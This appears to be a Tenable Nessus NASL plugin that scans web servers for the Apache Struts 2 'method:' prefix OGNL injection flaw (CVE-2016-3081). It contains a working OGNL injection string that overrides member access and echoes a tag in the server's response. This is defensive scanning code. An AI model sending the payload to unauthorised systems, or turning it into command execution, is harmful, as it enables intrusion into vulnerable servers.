#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(119728);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2016-3081");
  script_bugtraq_id(87327);

  script_name(english:"Apache Struts 2 'method:' Prefix Arbitrary Remote Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework, which is affected by a remote command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use Struts 2, a web framework
that utilizes OGNL (Object-Graph Navigation Language) as an expression
language. When Dynamic Method Invocation is enabled, it is possible to 
pass a malicious expression to the 'method:' prefix. A remote, 
unauthenticated attacker can exploit this issue to execute arbitrary 
commands on the remote web server.

Note that this plugin will only report the first vulnerable
instance of a Struts 2 application.");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-032");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.3.28.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2016-3081");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Struts Dynamic Method Invocation Expression Handling RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts Dynamic Method Invocation Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/04/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/04/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/12/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");
include("torture_cgi.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}
if (isnull(cgis) || thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;
http_set_read_timeout(timeout);

urls = list_uniq(urls);
vuln = FALSE;

tag = "tenable-"+rand();

foreach url (urls)
{
    vuln_url = url + "?tag="+tag+
    "&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,"+
    "%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),"+
    "%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close";

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      exit_on_fail : TRUE
    );

  pattern = "^"+tag+"$";
  if (!isnull(res[2]) && res[2] =~ pattern)
    vuln = TRUE;
  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(build_url(qs:vuln_url, port:port)),
  output     : chomp(res[2])
);
